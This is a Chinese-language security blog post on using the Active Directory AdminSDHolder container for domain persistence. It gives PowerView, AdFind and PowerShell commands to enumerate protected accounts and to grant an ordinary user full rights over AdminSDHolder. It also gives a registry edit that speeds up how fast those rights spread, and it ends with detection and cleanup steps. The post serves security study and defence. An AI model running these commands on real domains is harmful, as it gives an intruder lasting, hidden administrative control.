---
layout: post
title: 域渗透——AdminSDHolder
---


## 0x00 前言
---

AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板

Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的

如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法

本将要参考公开资料，结合自己的理解，介绍利用方法，补全清除ACL的方法，分析检测方法

## 0x01 简介
---

本文将要介绍以下内容：

- 利用思路
- 如何枚举受保护的AD账户和组中的信息
- 如何查询AdminSDHolder对象的ACL
- 如何向AdminSDHolder对象添加ACL
- 删除AdminSDHolder中指定用户的ACL
- 完整利用方法
- 检测建议

## 0x02 利用思路
---

### 1.枚举受保护的AD账户和组中的信息

通常为域内高权限用户，在我的Server2008R2下包含以下组：

- Administrators
- Print Operators
- Backup Operators
- Replicator
- Domain Controllers
- Schema Admins
- Enterprise Admins
- Domain Admins
- Server Operators
- Account Operators
- Read-only Domain Controllers
- Organization Management
- Exchange Trusted Subsystem

### 2.向AdminSDHolder对象添加ACL

例如，添加用户testa对AdminSDHolder的完全管理权限，默认60分钟以后会自动推送权限配置信息，testa随即获得对所有受保护帐户和组的完全管理权限

### 3.获得对整个域的控制权限

此时用户testa能够向域管理员组添加帐户，也能够直接访问域控制器上的文件

## 0x03 枚举受保护的AD账户和组中的信息
---

关于AdminSDHolder，可以参考的资料：

https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)#id0250006

受保护的AD账户和组的特征如下：

**AdminCount属性为1**

但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组

### 1.枚举受保护AD账户的方法

#### (1)PowerView

下载地址：

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

命令如下：

```
Get-NetUser -AdminCount
```

只筛选出用户名的命令如下：

```
Get-NetUser -AdminCount |select samaccountname
```

#### (2)Adfind

下载地址：

http://www.joeware.net/freetools/tools/adfind/index.htm

命令如下：

```
Adfind.exe -f "&(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
```

#### (3)ActiveDirectory模块

Powershell模块，需要安装，域控制器一般会安装

命令如下：

```
Import-Module ActiveDirectory
Get-ADObject -LDAPFilter “(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))” |select name
```

对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：

```
import-module .\Microsoft.ActiveDirectory.Management.dll
```

Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：

https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll

**注：**

该命令会列出受保护的AD账户和组

### 2.枚举受保护AD组的方法

#### (1)PowerView

命令如下：

```
Get-NetGroup -AdminCount
```

#### (2)Adfind

命令如下：

```
Adfind.exe -f "&(objectcategory=group)(admincount=1)" -dn
```

#### (3)ActiveDirectory模块

Powershell模块，需要安装，域控制器一般会安装

命令如下：

```
Import-Module ActiveDirectory
Get-ADObject -LDAPFilter “(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))” |select name
```

**注：**

该命令会列出受保护的AD账户和组

## 0x04 操作AdminSDHolder对象的ACL
---

### 1.查询AdminSDHolder对象的ACL

使用PowerView，地址如下：

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

**注：**

该版本不支持`Remove-DomainObjectAcl`命令

查询AdminSDHolder对象的ACL等价于查询"CN=AdminSDHolder,CN=System,DC=test,DC=com"的ACL

命令如下：

```
Import-Module .\PowerView.ps1
Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
```

### 2.向AdminSDHolder对象添加ACL

使用PowerView，地址如下：

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

添加用户testa的完全访问权限，命令如下：

```
Import-Module .\PowerView.ps1
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName testa -Verbose -Rights All
```

默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限

### 3.删除AdminSDHolder中指定用户的ACL

使用PowerView，地址如下：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

**注：**

该版本支持`Remove-DomainObjectAcl`命令，但不支持参数TargetADSprefix，所以这里使用TargetSearchBase参数代替

搜索条件为`"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com"`

删除用户testa的完全访问权限，命令如下：

```
Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com" -PrincipalIdentity testa -Rights All -Verbose
```

## 0x05 完整利用思路
---

### 1.枚举受保护的AD账户和组中的信息

查找有价值的用户，需要确认该用户是否属于受保护的AD账户和组，排除曾经属于受保护的AD账户和组

### 2.向AdminSDHolder对象添加ACL

例如添加用户testa对AdminSDHolder的完全访问权限

默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限

可以通过修改注册表的方式设置权限推送的间隔时间，注册表位置如下：

- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters,AdminSDProtectFrequency,REG_DWORD

例如修改成等待600秒的命令如下：

```
reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 600
```

参考资料：

https://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/

**注：**

不建议降低默认间隔时间，因为在大型环境中可能会导致LSASS性能下降

### 3.获得对整个域的控制权限

#### (1)用户testa能够向域管理员组添加帐户

验证权限的命令如下：

```
Import-Module .\PowerView.ps1
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'testa'}
```

#### (2)用户testa能够直接访问域控制器上的文件

## 0x06 检测和清除
---

### 1.检测AdminSDHolder的ACL

查看`"CN=AdminSDHolder,CN=System,DC=test,DC=com"`的ACL，命令如下：

```
Import-Module .\PowerView.ps1
Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
```

**注：**

这里使用的PowerView版本：

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

查看是否有可疑用户

### 2.清除AdminSDHolder中可疑用户的ACL

删除AdminSDHolder中可疑用户testa的ACL

使用PowerView，地址如下：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

删除用户testa的完全访问权限，命令如下：

```
Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com" -PrincipalIdentity testa -Rights All -Verbose
```

## 0x07 小结
---

本文介绍了AdminSDHolder作为权限维持的利用方法，补充了检测和清除AdminSDHolder中可疑用户ACL的方法


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




